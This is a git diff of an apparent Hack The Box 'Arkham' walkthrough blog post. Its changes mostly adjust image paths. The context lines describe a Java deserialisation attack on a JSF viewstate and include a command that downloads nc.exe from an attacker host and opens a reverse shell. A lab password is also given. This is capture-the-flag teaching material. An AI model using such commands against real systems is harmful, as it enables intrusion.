@@ -1,11 +1,8 @@
 ---
-title: Hack The Box: Arkham
+title: Hack The Box - Arkham
 tags: [HTB, webapp exploit, nmap, smb, LUKS, ysoserial, java deserialisation exploit, python, PSRemoting, UAC Bypass, DLL Hijack]
 layout: post
 ---                                                                  
-
-## Summary
-![Image](assets/img/arkham/arkham_info.PNG)
 
 - SMB - Mounting shares
 - LUKS encrypted image
@@ -17,6 +14,8 @@ layout: post
 - Privesc
   - Ez mode (root.txt only)
   - Hard Mode (UAC bypass via DLL hijack)
+  
+ ![Image](//assets/img/arkham/arkham_info.PNG) 
   
 ---
 ## Port Scan
@@ -118,7 +117,7 @@ The [Apache Myfaces Documentation](https://myfaces.apache.org/core20/myfaces-imp
 ---
 ## Web Enumeration
 The IIS web server on port 80 didn't seem to have any content besides the default IIS landing page. The Apache web server on port 8080 looked more interesting. I poked around the app from my browser and found a subscription page before my scanning tools turned up anything useful...
-![Image](assets/img/arkham/webapp_supscribe_page.PNG)
+![Image](//assets/img/arkham/webapp_supscribe_page.PNG)
 Some googling revealed that the `javax.faces.viewstate` value contains a **serialised** (uh oh...) **java object** that is encrypted, and used to store information about what information from a page should be displayed.
 Circling back to [The Documentation](https://myfaces.apache.org/core20/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html) - we now know that we are sending an encrypted, base64 encoded, HMAC signed serialised java object to the server! **If we can replace the serialised object with our own payload and correctly encrypt, sign and encode it... We should be able to get the server to deserialise it and hopefully execute code for us!**
 
@@ -213,7 +212,7 @@ else:
 ```
 
 Aaand ...success! Now to turn our RCE into a reverse shell. 
-![Image](assets/img/arkham/exploit_ping.PNG)
+![Image](/assets/img/arkham/exploit_ping.PNG)
 
 ---
 
@@ -238,7 +237,7 @@ I eventually found success with the `Invoke-WebRequest` cmdlet!
 
 `python exploit.py 'Powershell Invoke-WebRequest -URI "http://10.10.14.9/nc.exe -OutFile C:\Windows\System32\spool\drivers\color\nc.exe"; C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.14.9 443`
 
-![Image](assets/img/arkham/exploit_rev_shell.PNG)
+![Image](/assets/img/arkham/exploit_rev_shell.PNG)
 
 ---
 
@@ -327,7 +326,7 @@ Processing Folder "Server Failures"
 ```
 
 The mailbox structure has now been rebuilt under the working directory. In the Drafts folder we see 1 draft email from Alfred to Batman that says "Master Wayne Stop forgetting your password", and an image file which contains Batman's password: `Zx^#QZN+T!123`.
-![Image](assets/img/arkham/batman_password.PNG)
+![Image](/assets/img/arkham/batman_password.PNG)
 
 With Batman's credentials I should now be able to use Powershell to change users. One method is to use my existing shell to 'remote' into the localhost using Batman's Creds with the `Enter-PSSession` cmdlet.
 
